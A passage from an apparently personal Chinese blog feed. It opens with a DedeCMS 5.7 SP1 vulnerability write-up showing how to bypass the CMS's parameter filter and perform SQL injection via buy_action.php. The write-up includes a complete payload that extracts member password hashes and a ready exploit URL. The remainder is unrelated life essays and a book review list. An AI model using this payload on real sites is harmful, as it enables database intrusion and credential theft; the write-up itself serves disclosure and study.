&lt;p&gt;通过搜索整个源码文件，发现在buy_action.php文件的一个分支中使用了这个函数进行编码，并且只有这个地方进行了编码，相关代码如下：&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;//省略部分代码
if(!isset($paytype))
{    
    $inquery = &quot;INSERT INTO #@__member_operation(`buyid` , `pname` , `product` , `money` , `mtime` , `pid` , `mid` , `sta` ,`oldinfo`)
   VALUES ('$buyid', '$pname', '$product' , '$price' , '$mtime' , '$pid' , '$mid' , '0' , '$ptype');
    &quot;;
    $isok = $dsql-&amp;gt;ExecuteNoneQuery($inquery);
    if(!$isok)
    {
        echo &quot;数据库出错，请重新尝试！&quot;.$dsql-&amp;gt;GetError();
        exit();
    }
    
    if($price=='')
    {
        echo &quot;无法识别你的订单！&quot;;
        exit();
    }
    
    //获取支付接口列表
    $payment_list = array();
    $dsql-&amp;gt;SetQuery(&quot;SELECT * FROM #@__payment WHERE enabled='1' ORDER BY rank ASC&quot;);
    $dsql-&amp;gt;Execute();
    $i = 0 ;
    while($row = $dsql-&amp;gt;GetArray())
    {
        $payment_list[] = $row;
        $i++;
    }
    unset($row);

    $pr_encode = '';
    foreach($_REQUEST as $key =&amp;gt; $val)
    {
        $pr_encode .= $pr_encode ? &quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;$key=$val&quot; : &quot;$key=$val&quot;;
    }
    $pr_encode = str_replace('=', '', mchStrCode($pr_encode));
    
    $pr_verify = md5(&quot;payment&quot;.$pr_encode.$cfg_cookie_encode);
    
    $tpl = new DedeTemplate();
    $tpl-&amp;gt;LoadTemplate(DEDEMEMBER.'/templets/buy_action_payment.htm');
    $tpl-&amp;gt;Display();
    
}//省略部分代码
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;通过这部分代码，我想到的利用方法是提交带有【cfg_dbprefix=SQL注入】的提交请求，进入这个分支，让它帮助我来编码【cfg_dbprefix=SQL注入】，从而获取相应的pr_encode和pr_verify。
但是，这样利用的话就会引出第三个问题，common.inc.php文件中对于用户提交的内容进行了过滤，凡是以cfg_、GLOBALS、_GET、_POST、_COOKIE等内容开头的提交都会被拦截。&lt;/p&gt;

&lt;p&gt;这个问题的解决就利用到了$_REQUEST内容与parse_str函数内容的差异特性。试想，我们向网站传递“a=1&amp;amp;b=2%26c=3”这样的提交时，$_REQUEST的内容是【a=1，b=2%26c=3】.而通过上面代码的遍历进入parse_str函数的内容则是【a=1&amp;amp;b=2&amp;amp;c=3】，解析后的内容就变成了【a=1，b=2，c=3】。由此，我们可以通过这一特性来绕过common.inc.php文件对于参数内容传递的验证。&lt;/p&gt;

&lt;p&gt;#0x04 漏洞重现
访问buy_action.php文件，使用如下参数：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;product=card&amp;amp;pid=1&amp;amp;a=1%26cfg_dbprefix=dede_member_operation WHERE 1=@&lt;code class=&quot;highlighter-rouge&quot;&gt;'&lt;/code&gt; /&lt;em&gt;!12345union&lt;/em&gt;/ select 1,2,3,4,5,6,7,8,9,10 FROM (SELECT COUNT(&lt;em&gt;),CONCAT( (SELECT pwd FROM dede_member LIMIT 0,1),FLOOR(RAND(0)&lt;/em&gt;2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a %23&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;其中product和pid参数是为了让我们进入mchStrCode对传入数据进行编码的分支，a是为了配合上面提到的差异特性而随意添加的参数。从cfg_dbprefix开始，便是真正的SQL注入攻击代码。
访问该URL后，在页面源码中找到pd_encode和pd_verify字段的值，由于用户Cookie和User-Agent不同，所获取的值也不同，我这里获取的值非别为&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pd_encode:FkBdXBdXFw4AWEtVFkVQVwUEQFMPCURXBVQ8XVtBQlBfWkAIAldWXT1ZBl4BXEtuX0VcQVlBD11cGDV8JmEmGQgMcFVlFFgVSRgTCVAHVwYWV1BeXh8WE0tQCldRTEIFTwFPChUFHAAVBRQCSgoeAU4FUxMla3Z8EB1qdnRwJWYSey1hLWdLExAdc3p3cHlhThIaayd4JnA3GUlGVBV/YXd4RlZXXAdrDlYOW1xDEHlwfnFhRgIeCUsYJX8sdmsZYnR3dxAFTxgAEUtMQ3UxdnQReXt/fGp4J2Z7dyxrMHArfHRwHnZxcmp0JWZ3aj1nJmcwGX5jf2BpE3psRkobWUIXRWMraWp0Y2ZwdwUBUgZQDVRRUlJSAF8IBAQBAQhWVAMKDgBSUgYBXw0AARN9VlxQM0FXSitwXgFFfVxVVWBKVkp8Im1tWwl5BwZeD1wGCANaUQAGAgJUCFYHVRUnXF1UfFpeWlZhD19XBVMHWgBbCA0GAAwfd11RA35dXwtaN1oOXGZuU150Vw0IA1ELW1cDAQBaWg0CAwUBVg；
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pd_verify：1c7ba5d2861959347d0c427684a6ad30。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;以这两个字段作为参数访问buy_action.php，URL为：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://192.168.188.142//dedecms5.7_sp1_utf8/member/buy_action.php?pd_encode=FkBdXBdXFw4AWEtVFkVQVwUEQFMPCURXBVQ8XVtBQlBfWkAIAldWXT1ZBl4BXEtuX0VcQVlBD11cGDV8JmEmGQgMcFVlFFgVSRgTCVAHVwYWV1BeXh8WE0tQCldRTEIFTwFPChUFHAAVBRQCSgoeAU4FUxMla3Z8EB1qdnRwJWYSey1hLWdLExAdc3p3cHlhThIaayd4JnA3GUlGVBV/YXd4RlZXXAdrDlYOW1xDEHlwfnFhRgIeCUsYJX8sdmsZYnR3dxAFTxgAEUtMQ3UxdnQReXt/fGp4J2Z7dyxrMHArfHRwHnZxcmp0JWZ3aj1nJmcwGX5jf2BpE3psRkobWUIXRWMraWp0Y2ZwdwUBUgZQDVRRUlJSAF8IBAQBAQhWVAMKDgBSUgYBXw0AARN9VlxQM0FXSitwXgFFfVxVVWBKVkp8Im1tWwl5BwZeD1wGCANaUQAGAgJUCFYHVRUnXF1UfFpeWlZhD19XBVMHWgBbCA0GAAwfd11RA35dXwtaN1oOXGZuU150Vw0IA1ELW1cDAQBaWg0CAwUBVg&amp;amp;pd_verify=1c7ba5d2861959347d0c427684a6ad30
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;效果如下图所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/content/2014-03-04-01.jpg&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>人生苦短，奈何执着</title>
   <link href="http://localhost:4000/%E9%9A%8F%E6%83%B3/2014/02/27/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD-%E5%A5%88%E4%BD%95%E6%89%A7%E7%9D%80.html"/>
   <updated>2014-02-27T21:34:28+08:00</updated>
   <id>http://localhost:4000/%E9%9A%8F%E6%83%B3/2014/02/27/人生苦短，奈何执着</id>
   <content type="html">&lt;p&gt;&lt;img src=&quot;http://ww4.sinaimg.cn/large/3f18819bgw1edybe29wr9g20ig0bgh00.gif&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我们从上学到上班，周围总是不断上演着聚散离合的闹剧。&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;还记得大学毕业时，散伙饭上悠哉的看着满屋的人哭的一塌糊涂，可是在从饭店回去的路上却是莫名的哭起来了。当时的场景现在还记得很清楚，出了饭店到超市买了一桶水，然后一个人拎着水回宿舍，走着走着不知道为什么就哭起来了，边哭边念，再也不是学生了。&lt;/p&gt;

&lt;p&gt;其实这种时候，每个人执着的都有不同，有的人执着的是那些人，有的人执着的是那些事，有的人（像我）执着的是那个环境。与其说是执着，倒不如说是惯性。认识那么久的同学，一起打dota的室友，难免不舍，而且确实在学校之外很难再找到有那种感觉的人了。做了那么多年的学生，悠哉的上课、不上课、逃课的生活，突然变成了早出晚归的上班节奏，难免有些对未知茫然的感觉。&lt;/p&gt;

&lt;p&gt;虽然这些惯性算不上什么执着，但有时确实影响这我们的心情，尤其是当这些遇上了真的执着的时候。当我们面对抉择，经常会纠结于惯性与执着之间，难以自拔。选择执着，却又对惯性恋恋不舍；选择惯性，又会心有不甘。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;如果是我面对这种选择时，我会毫不犹豫的跟随心的方向，选择执着。惯性虽然被打破，可是却埋下了重聚的期盼和喜悦。况且即使你&lt;em&gt;坚守&lt;/em&gt;着那份惯性，惯性中的人也许有一天会主动打破惯性，毕竟人都是个性鲜明的个体，惯性的存在是以个体的喜好来决定的。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;##结语&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;人生苦短，奈何逆水行舟，我们又不得不执着。对事的惯性，就存放它到记忆，把玩它在回忆；对环境的惯性，就把它丢到风里，回味它在酒里；对人的惯性，就把它想在心里，重逢它在欢笑里。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;不过对某些人的惯性，就像是牛皮糖，甩不掉，吞不下，用文艺青年的话，就是铭在心上，刻在骨里。即使在你想开时，不再纠结与现实中的他时，他却成了你脑海的一个模型，就像《黑暗森里》中，罗辑所纠结的那样。不过他比我幸运，我也比他幸运。（PS：这段与全文无关，纯属抽风，请自觉忽略(￣▽￣)）&lt;/strong&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>testcode</title>
   <link href="http://localhost:4000/2014/02/20/test.html"/>
   <updated>2014-02-20T22:58:50+08:00</updated>
   <id>http://localhost:4000/2014/02/20/test</id>
   <content type="html">&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>当考试遇上了社会</title>
   <link href="http://localhost:4000/%E9%9A%8F%E6%83%B3/2014/02/20/%E5%BD%93%E8%80%83%E8%AF%95%E9%81%87%E5%88%B0%E4%BA%86%E7%A4%BE%E4%BC%9A.html"/>
   <updated>2014-02-20T20:32:48+08:00</updated>
   <id>http://localhost:4000/%E9%9A%8F%E6%83%B3/2014/02/20/当考试遇到了社会</id>
   <content type="html">&lt;p&gt;&lt;img src=&quot;http://www.meimeidu.com/Upload/%E5%87%A1%E4%BA%BA%E5%A4%A7%E6%99%BA%E6%85%A7/201107201632325593.jpg&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我们在学生时期，被老师和家长不停的灌输着学习好就能获得优质生活的思想（说直白点，就是有钱，有房，有美女），而放弃了思考，投身于人民海洋一样的高考。可是，当我们拿到了不错的考试分数时，我们非但没有欣喜，反而更加迷茫了，我要学什么？这时强势一点的家长，就会像那些看今年什么卖得好就种什么的农民一样，帮我们选择最热门的专业。&lt;/p&gt;

&lt;p&gt;毕业后，我们继续茫然，要做什么呢？拿我自己作为例子来看，周围学习计算机的同学，大多都去做了和计算机毫不相关的工作，做了计算机的也是毫无乐趣的混吃等死。女生几乎全军覆没，唯一那星星点点还站着的，也都去考了研，来获取缓刑的时间。&lt;/p&gt;

&lt;p&gt;他们都忘记了追逐自己的内心，接受了恶魔的指引，放弃手中改变现实的机会。越写鸡汤味越重，直接上主菜吧。&lt;/p&gt;

&lt;p&gt;如果你现在仍在迷茫，或者在怀疑自己现在的生活。请闭上你的双眼，想象你内心所向往的生活（如果是嫁入豪门，或者被富婆包养之类，你就可以去死了）和事业。事业和生活的关系应该是是，事业带来生活的快乐，这不是单单指物质层面的快乐，还有精神层面的，甚至精神层面的享受要高于物质层面的。&lt;/p&gt;

&lt;p&gt;什么？没听懂？就是让你找一份一喜欢的工作去做。怎么找喜欢的工作？玩网游，战士、法师、刺客只能选一个职业，你怎么选？当然是先看介绍，找合自己脾气的那个了。介绍要是看不懂，就找点优秀玩家的视频研究。要是时间经得起浪费的，可以找两个备选的，挨个试一下呗。玩了那么多网游，这还要我教？&lt;/p&gt;

&lt;p&gt;找到了方向，后面的也就简单了，但也是最难的。你要一步一步的，坚定不移的走下去，即使前面是一条粉身碎骨的悬崖，因为这是你自己的选择。还要记住一步一步，把自己那颗浮躁的心按到地下。当然，如果你真的爱上了你走的路，你会乐于享受这一步步的过程，即使尖利的石子割的你满脚伤痕。&lt;/p&gt;

&lt;p&gt;##结语&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;我们都茫然走在一个充满未知的“歧路”上，穷尽一生只为走向一个空白墓碑作为我们的终点。当到达终点时，才发现原来这一路上的心酸与美好，就是我们在这条路上所寻找的。而这些，最后都会变成那空白墓碑上的墓志铭，伴随我们到不朽。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;不要停止思考，因为我要用它寻找美好。对，就是美好。在明知必然走向死亡的一生，为何不让这一路的美好多一些呢？而这些美好，是需要我们的思考来探索和寻找的。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;本来想写篇关于思考的文章，谁知越写越飘，写了2千多字，没有一点主题，所以就截取了这一段还算完整的内容，送给我的那些即将研究生毕业和挣扎在’人生是否由此虚度思考中’的同学。&lt;/strong&gt;&lt;/p&gt;

</content>
 </entry>
 
 <entry>
   <title>别丢弃你的求知欲</title>
   <link href="http://localhost:4000/%E9%9A%8F%E6%83%B3/2014/02/16/%E5%88%AB%E4%B8%A2%E5%BC%83%E4%BD%A0%E7%9A%84%E6%B1%82%E7%9F%A5%E6%AC%B2.html"/>
   <updated>2014-02-16T21:20:36+08:00</updated>
   <id>http://localhost:4000/%E9%9A%8F%E6%83%B3/2014/02/16/别丢弃你的求知欲</id>
   <content type="html">&lt;p&gt;&lt;strong&gt;你是不是觉得现在的生活离开了手机和网游就变的很无聊？如果是，那么这篇文章也许会帮你找到解决办法。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/3f18819bgw1edllx2on3oj20p00gkwfa.jpg&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;&lt;em&gt;镜头一：一个意气风发的小伙子成为了公务员，从此每天忙活在领导身边。闲时和同事们一起聊他们自己也搞不懂的政治，回家后和家人亲戚一派领导风范。&lt;strong&gt;而且对任何事情都不屑一顾，或者说是不感兴趣&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;镜头二：40年后，当年的小伙子退休了，无聊的坐在沙发上，手中不断按着电视摇控器的换台按钮。家人朋友叫他出去走走，摇头说没意思，推荐一些有趣的好书给他，摇头说看不进去。和家人亲戚说话依旧是一派领导风范。&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;看到上面的两个镜头，一定有人觉得我要批判中国的公务员制度了，这位五毛亲，先把手里的砖头放下，我今天只谈求知欲，公务员改天再批凸^-^凸。也许我用公务员作引子容易引起其他的联想，但是想一想如果我们单纯的为了挣钱而工作，或者说是为了工作而工作，即使在私企，由和公务员有什么区别呢？&lt;/p&gt;

&lt;p&gt;抛开工作不提，单说业余时间的利用，我们又都用来干了什么呢？刷微博、看视频、逛淘宝、朋友圈，等等？我们生活在信息高速传播的互联网时代，但是对比那个公务员，除了把他当时的娱乐项目——看电视，换成了上网消磨时间，还有什么不同吗？试想下，在40年后，现在的娱乐变成了如今电视的存在时，我们和退了休的他又有什么不同吗？&lt;/p&gt;

&lt;p&gt;我无心追溯这些问题的本质，也没有时间来批判它们，我的目的只有一个解决它们，让这样的问题不会出现在我的身上。答案其实很简单，如果你没有忘记文章标题的话。&lt;/p&gt;

&lt;p&gt;我所说的求知欲，并非那种书呆子所有的特质，而是好奇心与玩嗨（语言太匮乏的，先用这词吧）的奇特组合。&lt;/p&gt;

&lt;p&gt;好奇心是指，我们需要保持一颗对新鲜事物永远想玩的冲动。当然新鲜不仅仅是那些刚出锅热乎乎的，还有那些我们不知道的，和那些我们知道却装逼不做的事。&lt;em&gt;例如：我不会打台球，却被朋友叫去一起打。好啊！虽然被虐的很惨的回来了，但是我开辟了一个我以前从未接触的方面。什么？有什么用？尼玛，你是要笨死啊！多一个泡妞技能，你说有没有用？就算没妞可泡，用来和新朋友增进感情也可以吧！白痴！&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;当然台球也仅仅是个例子，所有你生活中，周围人大家都在玩的，或者有些朋友口碑不错的事物，都应该尝试下。这样也许40年以后，我们可以和那时的年轻人，甚至是小孩子，聊一聊iphone10啊，泷泽罗拉的孙女什么的(￣▽￣)。&lt;/p&gt;

&lt;p&gt;另外浅尝辄止的接触还不够，我们还要玩它玩到嗨（改自：日她日到吐凸^-^凸）。我认识的一个朋友玩的东西都很专业，玩手串，人家盘的出好珠子，原理细节讲的头头是道；打台球，人家常常流转于各个台球厅的比赛；说相声，人家厮混于各种专场，不演也能上后台溜溜。你们感受下，人家玩的这水平。&lt;/p&gt;

&lt;p&gt;但是，如果你仔细想一想，这些东西玩到他这程度，也算不上什么。手串，没事上网搜搜资料，稍微琢磨琢磨，买几个手串，自己没事时盘着玩玩，能花多长时间，半年也就够了，而且平均到每天也就2-3个小时。台球，认真看些教学视频，无聊时自己练着玩玩，连续3、4个月，还不能在你朋友圈里崭露头角，那你就真可以去死了。好了，说到这里，又有同学忍不住掏出砖头了。请忍耐一下，马上就到结尾了。&lt;/p&gt;

&lt;p&gt;我举这个朋友的例子，只是想告诉你，我们玩这些东西，不需要玩到专业，只要能玩开心就好。你能花大把的时间在熟悉一个新网游的上面，就不能拿出一丢丢的时间在这些可以真人约炮的实用技能上？&lt;/p&gt;

&lt;p&gt;##结语&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;无聊的人，看什么都是无聊的。为了40年之后，我们不会在无聊中等死，从现在开始学习新的事物，然后把它玩嗨吧！&lt;/strong&gt;&lt;/p&gt;

</content>
 </entry>
 
 <entry>
   <title>盘点2013年读过的书</title>
   <link href="http://localhost:4000/%E8%AF%BB%E4%B9%A6/2014/02/02/%E7%9B%98%E7%82%B92013%E5%B9%B4%E8%AF%BB%E8%BF%87%E7%9A%84%E4%B9%A6.html"/>
   <updated>2014-02-02T20:46:19+08:00</updated>
   <id>http://localhost:4000/%E8%AF%BB%E4%B9%A6/2014/02/02/盘点2013年读过的书</id>
   <content type="html">&lt;p&gt;终于有时间坐下来盘点下自己2013年读过的书了，本来想年前搞定的，可是。。。爱情公寓、三体、博客、聚会。。。总之各种拖延。不过，好在今天终于能咬牙坐下来写了。&lt;/p&gt;

&lt;p&gt;废话也不多说了，先看看去年（蛇年）我都读完了什么书吧。《&lt;a href=&quot;http://www.amazon.cn/%E6%8E%98%E9%87%91%E9%BB%91%E5%AE%A2-%E9%A9%AC%E5%85%8B%E6%96%AF%E2%80%A2%E7%BB%B4%E4%BA%AC-%E5%9C%B0%E4%B8%8B%E7%BD%91&quot;&gt;掘金黑客&lt;/a&gt;》《&lt;a href=&quot;http://www.amazon.cn/%E9%AB%98%E6%95%88%E8%83%BD%E4%BA%BA%E5%A3%AB%E7%9A%84%E4%B8%83%E4%B8%AA%E4%B9%A0%E6%83%AF-%E5%8F%B2%E8%92%82%E8%8A%AC%E2%80%A2%E6%9F%AF%E7%BB%B4/dp/B00B4NTCT2/ref=sr_1_1?ie=UTF8&amp;amp;qid=1391350889&amp;amp;sr=8-1&amp;amp;keywords=%E9%AB%98%E6%95%88%E8%83%BD%E4%BA%BA%E5%A3%AB%E7%9A%84%E4%B8%83%E4%B8%AA%E4%B9%A0%E6%83%AF&quot;&gt;高效能人士的七个习惯&lt;/a&gt;》、《&lt;a href=&quot;http://www.amazon.cn/%E8%AE%BA%E4%B8%AD%E5%9B%BD-%E4%BA%A8%E5%88%A9%E2%80%A2%E5%9F%BA%E8%BE%9B%E6%A0%BC/dp/B009AL1FPE/ref=sr_1_1?ie=UTF8&amp;amp;qid=1390628477&amp;amp;sr=8-1&amp;amp;keywords=%E8%AE%BA%E4%B8%AD%E5%9B%BD&quot;&gt;论中国&lt;/a&gt;》、《&lt;a href=&quot;http://www.amazon.cn/%E9%98%BF%E7%B1%B3%E5%A5%97%E8%A3%85-%E7%B3%BB%E5%88%972008%E5%B9%B4%E7%99%BB%E5%85%A5%E4%B8%AD%E5%9B%BD-%E7%AB%8B%E5%88%BB%E5%90%B8%E5%BC%95%E4%BA%86%E6%97%A0%E6%95%B0%E5%B0%91%E5%B9%B4%E5%84%BF%E7%AB%A5%E7%9A%84%E7%9B%AE%E5%85%89-%E8%87%B3%E4%BB%8A%E5%B7%B2%E7%83%AD%E9%94%80500%E4%B8%87%E5%86%8C-%E5%9C%A8%E5%85%A8%E7%90%83%E8%A2%AB%E8%AF%91%E6%88%90%E5%8D%81%E4%BA%8C%E7%A7%8D%E8%AF%AD%E8%A8%80-%E4%B8%96%E7%95%8C%E5%90%84%E5%9C%B0%E9%83%BD%E6%9C%89%E5%AE%83%E5%BF%A0%E5%AE%9E%E7%9A%84%E8%AF%BB%E8%80%85-%E5%A7%94%E5%86%85%E7%91%9E%E6%8B%89-%E6%81%A9%E9%87%8C%E5%85%8B%C2%B7%E5%B7%B4%E9%87%8C%E5%A5%A5%E6%96%AF/dp/B009QI16N2/ref=sr_1_1?ie=UTF8&amp;amp;qid=1391351519&amp;amp;sr=8-1&amp;amp;keywords=%E9%98%BF%E7%B1%B3&quot;&gt;阿米&lt;/a&gt;》三部曲、《&lt;a href=&quot;http://www.amazon.cn/gp/product/B006DVQKCC/ref=cm_cr_ryp_prd_ttl_sol_6&quot;&gt;浩荡两千年&lt;/a&gt;》、《&lt;a href=&quot;http://www.amazon.cn/%E6%B5%AA%E6%BD%AE%E4%B9%8B%E5%B7%85-%E5%90%B4%E5%86%9B/dp/B00D73BJWK/ref=sr_1_1?ie=UTF8&amp;amp;qid=1391351582&amp;amp;sr=8-1&amp;amp;keywords=%E6%B5%AA%E6%BD%AE%E4%B9%8B%E5%B7%85+%E7%AC%AC%E4%BA%8C%E7%89%88&quot;&gt;浪潮之巅&lt;/a&gt;》第二版、《&lt;a href=&quot;http://www.amazon.cn/gp/product/B00D406VWO/ref=cm_cr_ryp_prd_ttl_sol_4&quot;&gt;中国国民性演变历程&lt;/a&gt;》。还有几本没看完，陪我跨年了的，《&lt;a href=&quot;http://www.amazon.cn/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B-%E5%AE%89%E5%85%A8%E4%BD%93%E7%B3%BB%E4%B8%AD%E7%9A%84%E4%BA%BA%E6%80%A7%E6%BC%8F%E6%B4%9E-%E6%B5%B7%E5%BE%B7%E7%BA%B3%E5%90%89/dp/B00GWP2GG8/ref=sr_1_1?ie=UTF8&amp;amp;qid=1391351654&amp;amp;sr=8-1&amp;amp;keywords=%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6&quot;&gt;社会工程:安全体系中的人性漏洞&lt;/a&gt;》、《&lt;a href=&quot;http://www.amazon.cn/s/ref=nb_sb_noss_1?__mk_zh_CN=%E4%BA%9A%E9%A9%AC%E9%80%8A%E7%BD%91%E7%AB%99&amp;amp;url=search-alias%3Daps&amp;amp;field-keywords=%E4%B8%89%E4%BD%93&amp;amp;rh=i%3Aaps%2Ck%3A%E4%B8%89%E4%BD%93&quot;&gt;三体&lt;/a&gt;》三部曲。&lt;/p&gt;

&lt;p&gt;让我按阅读时间一本一本的来详细的盘点下这些书吧。&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;##《掘金黑客》&lt;/p&gt;

&lt;p&gt;一本纪实小说，纪录了一个地下产业链中黑客的成长与被捕的过程。向非专业人士揭开了一角地下黑客产业链的面纱——信用卡磁条盗取，而主人公则是这个产业链中的佼佼者。不过对于现实生活中的互联网黑色产业，这只是众多根须中一条，虽然它已经很靠近主根了。&lt;/p&gt;

&lt;p&gt;主人公的成长历程也和其他描述黑客成长的纸质文学（非网络意淫小说）一样，先描述幼年的悲催的遭遇，迫使他幼小的内心出现了扭曲（貌似每个牛逼的黑客，必然有个悲催的同年，我记得凯文也是。。。）。从而造成了他成年后一些极端的行为，例如，对女友使用暴力。&lt;/p&gt;

&lt;p&gt;关于技术层面的描述，比例不是很大，而且都是一带而过，毕竟这是小说。不过我还是发现了几个比较有趣，或者说是我没想过的地方，比如：盗取免费无线进行网络攻击的隐蔽性很高，尤其是在当今国内这种wifi满街飞的年代；仿制信用卡磁条当初在国外很容易，而且造价也不是很高，年代也不是很久远，也许国内未来也会火一段时间，甚至说现在就有了，只不过隐蔽的很好罢了；在当年刚刚有互联网的年代，一个漏洞能够爽到任何国家机构的机器任我遨游的地步。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;虽然说这本书是写给非专业人士的互联网黑色产业的科普小说，但是我想阅读它的应该还是安全技术相关的人士吧。相比网络黑客小说，这本书少了意淫的痛快，多了现实的气息。如果你是一个想要摆脱网络意淫小说的计算机领域学习者，这本书没准会拯救你。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;不过小说，毕竟是小说，休闲解闷而已。这种纪实文学，类似的还有自传类的书，如果真的看到心里去了，那可就真是毁人不倦了。毕竟每个人的路都不能复制，你只看到了人家披荆斩棘后给你描述的画面，你怎么知道这道路的后面有什么少儿不宜的故事呢？&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;##《高效能人士的七个习惯》&lt;/p&gt;

&lt;p&gt;一本彻底改变我为人处事的行为和思考方式的书，七个习惯：积极主动、以终为始、要事第一、双赢思维、知彼解己、综合统效、不断更新。&lt;/p&gt;

&lt;p&gt;虽然我还停留在第一阶段——个人领域的探索，但它对我的很多方面都给予了颠覆式的启发，像对待任何问题要保持积极主动的状态，对自己要做的事情要有明确的目标，与人交流倾听比诉说要重要很多（《社会工程学》中进一步的说明了这点的重要性）。&lt;/p&gt;

&lt;p&gt;这本书真心不错，打算在2014年再读一到两遍。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;虽然这本书不能帮你成就一番伟大的事业，但它足以帮你成为一个健康、开朗、优秀的人。好书不用多说，如果认真看完，觉得对你一点用处没有，来抽我。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;##《论中国》&lt;/p&gt;

&lt;p&gt;一本外国外交家看中国的历史书，从政治的角度切入，读起来还是很过瘾的。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;在我上一篇《&lt;a href=&quot;http://www.tang3.org/blog/2014/01/28/2013%E5%B9%B4%E6%88%91%E8%AF%BB%E8%BF%87%E7%9A%84%E5%8E%86%E5%8F%B2%E4%B9%A6/&quot;&gt;2013年我读过的历史书&lt;/a&gt;》对它有较为详细的描述和评价，这里就不多说了。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;##《阿米》三部曲&lt;/p&gt;

&lt;p&gt;三本分别是《星星的孩子》、《爱的文明》和《宇宙之心》，借外星人来向世人普及爱的力量，很难用语言描述出它其中内容所带来的意义。这部书的内容偏向哲学、宗教，给人一种由内而外的启迪。&lt;/p&gt;

&lt;p&gt;主人公在他的外星人朋友的带领下，了解到宇宙中真正的力量来自爱，有爱的世界才是高层科技世界。后来主人公远在宇宙另一端的伴侣也加入到他们的旅程当中，发生了一些有趣的“感情戏”。&lt;/p&gt;

&lt;p&gt;读过它让我明白了感性之于理性还是有很多的作用，至少它能让我们保持一颗善良之心，凭借本能去分辨对错。欲望与感情是两种东西，但是大部分人很容易把它们弄混掉。追寻本心，保持原则，才能找到真正的我。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;虽然是一本写给孩子们的书，不过我还是极力推荐它作为家长读物，读过它你才会发现中国式教育的可悲，而且它也能帮你抹除你潜意识中那一丝中式余毒。也许看到这里你会觉得这本书是一本洗脑书，那我只能告诉你，这是我表达能力缺陷造成的，这本书是一本很好的思想扩展读物。不信？读一下试试^_^&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;##《浩荡两千年》&lt;/p&gt;

&lt;p&gt;一本从经济的角度，纵剖中国两千年历史的书，内容清晰，例证鲜明。我这样极其讨厌看历史的人，都能看的非常过瘾。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;和《论中国》一样，在《&lt;a href=&quot;http://www.tang3.org/blog/2014/01/28/2013%E5%B9%B4%E6%88%91%E8%AF%BB%E8%BF%87%E7%9A%84%E5%8E%86%E5%8F%B2%E4%B9%A6/&quot;&gt;2013年我读过的历史书&lt;/a&gt;》对它有较为详细的描述和评价，这里就不多说了。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;##《浪潮之巅》第二版&lt;/p&gt;

